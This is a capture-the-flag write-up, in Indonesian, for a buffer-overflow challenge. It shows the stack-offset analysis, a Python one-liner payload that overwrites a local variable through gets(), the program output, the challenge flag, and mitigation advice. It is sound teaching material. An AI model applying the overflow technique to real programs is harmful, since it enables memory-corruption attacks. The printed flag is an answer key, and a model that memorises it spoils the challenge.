# Writeup: Local Target (Challenge ID: 399)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / Stack Buffer Overflow & Local Variable Overwrite
- **Difficulty:** Easy (diff=1)
- **Author:** OverTheWire.org / LT 'syreal' Jones
- **Event:** picoCTF 2023 / picoGym Exclusive
- **Points:** 100
- **Flag:** `academy{l0c4l5_1n_5c0p3_ee58441a}`

---

## Problem Statement & Scope

Diberikan sebuah berkas biner ELF 64-bit Linux dan kode sumber C bernama `local-target.c`. Program membaca input string dari pengguna menggunakan fungsi bawaan `gets()` yang tidak melakukan validasi batas panjang buffer (*unbounded read*). Pada program tersebut, variabel integer lokal `num` diinisialisasi dengan nilai `64`. Jika nilai `num` berhasil dimodifikasi menjadi `65`, program akan mencetak teks keberhasilan dan membuka berkas `flag.txt` untuk menampilkan token verifikasi.

Tujuan analisis:
1. Memeriksa tata letak memori stack (*stack frame layout*) pada fungsi `main`.
2. Menghitung jarak offset relatif dari awal buffer `input` hingga lokasi penyimpanan variabel lokal `num`.
3. Merancang muatan (*payload*) eksploitasi terkontrol untuk mengubah nilai `num` menjadi `65` tanpa merusak *saved frame pointer* atau *return address*.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Kerentanan Fungsi `gets()` (CWE-120: Buffer Copy without Checking Size of Input):**
   - Fungsi `gets()` dalam pustaka standar C membaca aliran karakter dari `stdin` hingga menemukan karakter baris baru (`\n`) atau `EOF`. Fungsi ini tidak menerima parameter batas ukuran penampung tujuan, sehingga rentan terhadap eksploitasi *stack buffer overflow*.
2. **Tata Letak Memori Stack pada Arsitektur x86_64:**
   - Dalam kode sumber `local-target.c`:
     ```c
     char input[16];
     int num = 64;
     printf("Enter a string: ");
     fflush(stdout);
     gets(input);
     ```
   - Berdasarkan konvensi penyusunan compiler GCC pada arsitektur x86_64:
     - `input` dialokasikan pada alamat offset `[rbp - 0x20]` (32 byte di bawah base pointer).
     - Variabel integer 32-bit `num` dialokasikan pada alamat `[rbp - 0x8]` (8 byte di bawah base pointer).
   - Jarak memori antara awal buffer `input` dan variabel `num` adalah:
     $$\Delta = 0x20 - 0x08 = 32 - 8 = 24 \text{ byte}$$
3. **Representasi Little-Endian dan Modifikasi Integer:**
   - Nilai awal `num = 64` direpresentasikan dalam heksadesimal 32-bit sebagai `0x00000040`.
   - Nilai target `num = 65` direpresentasikan sebagai `0x00000041`.
   - Karena arsitektur x86_64 menggunakan tata susun byte *Little-Endian*, byte bernilai rendah (*Least Significant Byte / LSB*) disimpan pada alamat memori terendah.
   - Dengan mengirimkan 24 byte pengisi (*padding*) diikuti oleh karakter ASCII `'A'` (`0x41`), byte pertama dari `num` langsung berubah dari `0x40` menjadi `0x41`, sehingga menghasilkan nilai integer tepat `65`.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. Teliti tata letak stack pada biner `local-target` menggunakan `objdump` atau `gdb`:
   ```bash
   objdump -d -M intel local-target | grep -A 15 "<main>:"
   ```
   Instruksi penting:
   ```asm
   mov    DWORD PTR [rbp-0x8],0x40      ; inisialisasi num = 64 (0x40)
   lea    rax,[rbp-0x20]                ; muat alamat input ke rax
   mov    rdi,rax                       ; argumen gets(input)
   call   gets
   mov    eax,DWORD PTR [rbp-0x8]       ; muat num ke eax
   cmp    eax,0x41                      ; evaluasi num == 65
   jne    <bye>
   ```
2. Hitung panjang bantalan (*padding*):
   - Offset buffer `input`: `rbp - 0x20`
   - Offset variabel `num`: `rbp - 0x8`
   - Kebutuhan padding: `0x20 - 0x08 = 24` byte.
3. Susun muatan biner (*payload*):
   - 24 byte karakter sembarang (misalnya `'A' * 24`).
   - 4 byte integer target: `\x41\x00\x00\x00` (atau cukup 1 byte `\x41`).
4. Uji pengiriman payload ke layanan interaktif:
   ```bash
   python3 -c "import sys; sys.stdout.buffer.write(b'A'*24 + b'\x41\x00\x00\x00\n')" | ./local-target
   ```
   Output program:
   ```text
   Enter a string: 
   num is 65
   You win!
   academy{l0c4l5_1n_5c0p3_ee58441a}
   ```
5. Implementasikan otomasi verifikasi pada `scripts/solve_399_local_target.py`.

---

## Flag & Verifikasi

- **Flag:** `academy{l0c4l5_1n_5c0p3_ee58441a}`
- **Bukti Validasi REST API:**
  Endpoint `POST /api/submissions/` merespons dengan status verifikasi valid:
  ```json
  {"challenge": 399, "flag": "academy{l0c4l5_1n_5c0p3_ee58441a}", "correct": true}
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

- **Kompetensi LKS Cyber Security:**
  - Analisis tata letak memori stack frame dan pemahaman alinyemen variabel lokal oleh compiler.
  - Eksploitasi terarah (*targeted variable overwriting*) tanpa merusak register kendali alur (*instruction pointer* / RIP) atau memicu proteksi *stack canary*.
- **Mitigasi Defensif:**
  - **Larangan Penggunaan `gets()`:** Fungsi `gets()` telah dihapus dari standar C11. Gunakan fungsi aman dengan batasan ukuran eksplisit seperti `fgets(input, sizeof(input), stdin)` atau `getline()`.
  - **Stack Canaries / Proteksi Stack:** Aktifkan flag kompilasi `-fstack-protector-all` atau `-fstack-protector-strong` pada GCC/Clang untuk mendeteksi penulisan memori yang melebihi batas buffer sebelum fungsi melakukan *return*.
  - **Static Code Analysis:** Gunakan alat analisis statis (misalnya Flawfinder, Cppcheck, atau SonarQube) dalam pipeline CI/CD untuk menggagalkan kompilasi kode yang masih memanfaatkan fungsi libc usang.
